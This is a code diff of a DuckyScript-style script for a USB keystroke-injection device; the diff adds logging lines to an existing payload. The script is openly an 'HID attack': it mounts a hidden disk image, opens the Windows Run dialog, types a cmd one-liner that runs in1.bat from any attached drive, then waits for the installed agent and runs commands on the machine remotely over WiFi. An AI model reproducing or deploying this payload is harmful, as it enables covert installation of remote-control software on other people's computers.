@@ -2,10 +2,14 @@ REM To run this, you first need to create a disk image which contains the agent
 REM Follow tools/README.md for instructions
 REM Make sure the disk image is named agent.img you put it on the SD card
 
+LOG UK agent script
+
 DEFINE #FILE /agentInstalled
 
 REM Only install the agent if this is the first machine we've been plugged into
 IF (FILE_EXISTS() == FALSE) THEN
+  LOG agentInstalled file does NOT exist
+  LOG Installing agent
   USB_MOUNT_DISK_READ_ONLY /agent.img
 
   WAIT_FOR_USB_STORAGE_ACTIVITY
@@ -14,6 +18,7 @@ IF (FILE_EXISTS() == FALSE) THEN
 
   REM Searches each drive for a file name in1.bat. Run it if found
 
+  LOG Performing HID attack
   REM Open Run window
   GUI R
   DELAY 1000
@@ -23,6 +28,9 @@ IF (FILE_EXISTS() == FALSE) THEN
   REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack
   STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
   ENTER
+  
+  LOG HID attack complete
+  LOG Didnt see key presses? Check wiki for efuse instructions
 
   REM The script needs time from Windows to actually start
   DELAY 1000
@@ -39,9 +47,11 @@ IF (FILE_EXISTS() == FALSE) THEN
   RESET
 END_IF
 
+LOG Waiting for agent to respond
 WHILE (AGENT_CONNECTED() == FALSE)
   DELAY 2000
 END_WHILE
 
+LOG Agent responded
 REM run a command, to see the results check the log over WiFi
 AGENT_RUN dir
